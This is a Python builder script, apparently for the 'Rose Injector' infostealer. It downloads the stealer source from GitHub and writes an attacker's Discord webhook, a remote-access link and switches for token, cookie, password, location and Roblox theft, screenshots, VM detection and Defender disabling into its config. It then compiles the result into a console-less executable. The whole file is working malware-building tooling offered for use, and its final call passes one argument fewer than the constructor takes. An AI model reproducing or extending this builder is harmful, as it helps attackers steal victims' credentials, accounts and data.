import os 
import requests
from bs4 import BeautifulSoup
import shutil 
from pathlib import Path
import sys
import ctypes
import subprocess

import logging

logging.basicConfig(
    level=logging.DEBUG,
    filename='roselog.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"

class _Builder():    
    def __init__(
        self,
        dir_name,
        webhook_url,
        rat_checked,
        rat_link,
        is_startup,
        is_injection,
        is_tokensteal,
        is_cookiesteal,
        is_passwordsteal,
        is_malicioussteal,
        is_locationssteal,
        is_robloxsteal,
        is_screenshot,
        is_ping,
        is_vmdetect,
        vmwebhookurl,
        is_fakeerror,
        is_nitrobuy,
        is_defenderfucker
    ):        
        super().__init__()
        self.dir_name = dir_name
        self.webhook_url = webhook_url
        self.rat_checked = rat_checked
        self.rat_link = rat_link
        self.is_startup = is_startup
        self.is_injection = is_injection
        self.is_tokensteal = is_tokensteal
        self.is_cookiesteal = is_cookiesteal
        self.is_passwordsteal = is_passwordsteal
        self.is_malicioussteal = is_malicioussteal
        self.is_locationssteal = is_locationssteal
        self.is_robloxsteal = is_robloxsteal
        self.is_screenshot = is_screenshot
        self.is_ping = is_ping
        self.is_vmdetect = is_vmdetect
        self.vmwebhookurl = vmwebhookurl
        self.is_fakeerror = is_fakeerror
        self.is_nitrobuy = is_nitrobuy
        self.is_defenderfucker = is_defenderfucker
        
        logger.info("Building fully inialized")

    def create_dir(self):
        logger.info("Entered create_dir")
        try:       
            self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
            logger.info(f"Path in create_dir is {self.path}")
            os.mkdir(self.path)
        except Exception as e:
            logger.error(f"Error in create_dir: {e}")

    def make_req(self):
        try:
            logger.info("Entered make_req")
            page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
            soup = BeautifulSoup(page, 'html.parser')
            allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/source/{link.text}"]
            for file in allFiles:
                text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
                logger.info(f"Got {file} with {len(text)} characters")
                with open(f"{self.path}\\{file}","w",encoding="utf-8") as f:
                    logger.info(f"Writing {file} to {self.path}")
                    f.write(str(text))
                logger.info(f"Successfuly wrote {file} to {self.path}")
        except Exception as e:
            logger.error(f"Error in make_req: {e}")

    def edit_config(self):
        try:
            logger.info("Entered edit_config")
            with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
                text = f.read()
                new = text.replace("WEBHOOK_URL", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}").replace("screenshot = False", f"screenshot = {self.is_screenshot}").replace("discord_ping = False", f"discord_ping = {self.is_ping}").replace("defenderfucker = False", f"defenderfucker = {self.is_defenderfucker}").replace("fake_error = False", f"fake_error = {self.is_fakeerror}").replace("nitro_auto_buy = False", f"nitro_auto_buy = {self.is_nitrobuy}").replace("vmdetection = False", f"vmdetection = {str(self.is_vmdetect)}").replace("VMHOOK", f"{self.vmwebhookurl}")
            print(new)
            with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
                f.write(new)

            dir_list = os.listdir(self.path)

            for file in dir_list:
                with open(f"{self.path}\\{file}", "r", encoding="utf-8") as f:
                    text = f.read()
                    new = text.replace("from configuration", "from config")

                with open(f"{self.path}\\{file}", "w", encoding="utf-8") as f:
                    f.write(new)
        except Exception as e:
            logger.error(f"Error in edit_config: {e}")

    def compile(self):
        try:
            logger.info("Entering compile process")
            logger.info(f'Compile CMD Line: pyinstaller "{self.path}\main.py" --noconsole --onefile')
            output = subprocess.check_output(f'pyinstaller "{self.path}\main.py" --noconsole --onefile', shell=True, encoding='utf-8')
            with open("rosecompile.log", 'w') as f:
                f.write(output)
            logger.info(f"Output of compile process saved in rosecompile.log")
        except Exception as e:
            logger.error(f"Error in compile: {e}")

    def move_dir(self): 
        logger.info("Entering move_dir")
        try:
            shutil.move("dist\\main.exe", f"{self.dir_name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            os.remove("main.spec")
        except Exception as e:
            logger.error(f"Error in move_dir: {e}")

    def run(self):
        self.create_dir()
        self.make_req()
        self.edit_config()
        self.compile()
        self.move_dir()
        ctypes.windll.user32.MessageBoxW(0, "If everything went good, your compiled file should be in the roseui folder, else join .gg/D7Qpj8sKUF", "Rose Injector", 0)

if len(sys.argv) > 1:
    logger.info(f"Builder has been initialized with {len(sys.argv)} arguments")
    for index, arg in enumerate(sys.argv):
        logger.info(f"Argument number {index}: {arg}")
    _Builder(
        sys.argv[1],
        sys.argv[2],
        sys.argv[3],
        sys.argv[4],
        sys.argv[5],
        sys.argv[6],
        sys.argv[7],
        sys.argv[8],
        sys.argv[9],
        sys.argv[10],
        sys.argv[11],
        sys.argv[12],
        sys.argv[13],
        sys.argv[14],
        sys.argv[15],
        sys.argv[16],
        sys.argv[17],
        sys.argv[18]
    ).run()
